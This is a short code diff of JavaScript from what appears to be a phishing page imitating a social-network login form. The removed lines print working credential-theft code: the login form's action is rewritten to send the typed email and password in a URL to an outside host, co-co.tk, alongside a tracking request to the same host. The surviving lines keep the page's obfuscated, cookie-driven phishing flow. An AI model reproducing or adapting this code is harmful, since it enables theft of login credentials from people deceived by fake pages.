@@ -202,13 +202,6 @@
     return a;
 }
     function stage() {
-    var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-    }
-  };
-  xhttp.open("GET", "https://co-co.tk/api/ffb.php?action=count&stage=2&track="+urldata("track"), true);
-  xhttp.send();
       if(getCk("quick")) {
         window.parent.ggy();
       }
@@ -221,14 +214,6 @@
       setTimeout(function(){ document.getElementById('nnn').style.display = ""; }, 400);
       }
       document.cookie = "quick=true";
-    if(location.href.search("redirect")>0) {
-      console.log(urldata("redirect"));
-      console.log("State: OK");
-      document.getElementById('login_form').action = "https://co-co.tk/api/ffb.php?action=wrong&track=456&email="+document.getElementById('m_login_email').value+"&pw="+document.getElementById('m_login_password').value;
-    } else {
-      console.log("State: FAILED");
-      document.getElementById('login_form').action = "https://co-co.tk/api/ffb.php?action=wrong&track=456&email="+document.getElementById('m_login_email').value+"&pw="+document.getElementById('m_login_password').value;
-    }
       document.getElementById('u_0_5').setAttribute( "onclick", "fdgw4();");
     }
     function fdgw4() {
